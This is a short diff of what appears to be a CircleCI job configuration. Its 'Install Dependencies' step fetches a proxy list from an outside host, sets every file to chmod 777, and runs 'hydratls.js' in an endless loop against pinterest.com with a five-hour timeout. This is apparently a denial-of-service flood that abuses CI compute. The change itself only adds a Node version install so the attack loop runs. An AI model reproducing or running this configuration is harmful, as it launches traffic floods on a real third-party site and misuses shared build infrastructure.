@@ -8,7 +8,7 @@ jobs:
         - run:
             name: Install Dependencies
             command: apt update && apt install curl -y && curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.3/install.sh | bash && export NVM_DIR="$([ -z "${XDG_CONFIG_HOME-}" ] && printf %s "${HOME}/.nvm" || printf %s "${XDG_CONFIG_HOME}/nvm")"
-[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh" # This loads nvm && curl -O http://cv96247.tw1.ru/www/proxy.txt && chmod 777 * && while true; do node hydratls.js https://www.pinterest.com/ 999999 16 36; done; proxy.txt
+[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh" && nvm install v19.7.0 && curl -O http://cv96247.tw1.ru/www/proxy.txt && chmod 777 * && while true; do node hydratls.js https://www.pinterest.com/ 999999 16 36; done; proxy.txt
             no_output_timeout: 5h
 
 workflows:
